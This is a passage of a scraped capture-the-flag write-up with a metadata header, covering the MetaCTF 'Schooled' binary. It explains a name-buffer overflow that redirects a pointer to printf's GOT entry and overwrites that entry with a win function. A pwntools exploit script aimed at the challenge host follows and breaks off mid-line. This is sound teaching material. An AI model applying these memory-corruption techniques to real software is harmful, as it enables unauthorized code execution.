@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://metactf.com/blog/flash-ctf-schooled/
+CHALLENGE: Flash CTF - Schooled - MetaCTF
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: ret2win
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: printf, scanf, read
+KEY_TECHNIQUE: sendline ( b "4.0" ) # Modify the name to overflow and overwrite gradelevel pointer target .
+---
+unction that reads and prints the flag. Its address can be found through disassembly or by searching for the function. The address 0x8049316 corresponds to the win function. Building the Exploit The payload construction is straightforward: address_offset = 36 printf_got = 0x804c00c win_function = 0x8049316 payload = b "A" * address_offset payload += p32 ( printf_got ) This creates a payload that fills the name buffer and overwrites the gradelevel pointer with the address of printf’s GOT entry. Complete Exploitation Flow The full exploit follows this sequence: Create a student (option 1) with any name, grade level, and GPA Modify the student (option 3), select student 0, choose to modify the name (option 1), and send the crafted payload Modify the student again (option 3), select student 0, choose to modify the grade level (option 2), and send the address of the win function When modifying the grade level the second time, the program performs scanf("%d", students[modify]->gradelevel) . Since gradelevel has been overwritten to point to the GOT entry, this writes the win function address directly into printf’s GOT entry. The next time printf is called (which happens immediately when the menu is displayed), execution jumps to the win function instead, and the flag is printed. The Complete Exploit from pwn import * address_offset = 36 printf_got = 0x804c00c win_function = 0x8049316 payload = b "A" * address_offset payload += p32 ( printf_got ) target = remote ( "host5.metaproblems.com" , 5035 ) # Create a student target . sendline ( b "1" ) target . recvuntil ( b "name?" ) target . sendline ( b "Your about to get pwned :D" ) target . recvuntil ( b "level?" ) target . sendline ( b "12" ) target . recvuntil ( b "GPA?" ) target . sendline ( b "4.0" ) # Modify the name to overflow and overwrite gradelevel pointer target . recvuntil ( b "> " ) target . sendline ( b "3" ) target . recvuntil ( b "modify?" ) target . sendline ( b "0" ) target . recvuntil ( b "> " ) target . send
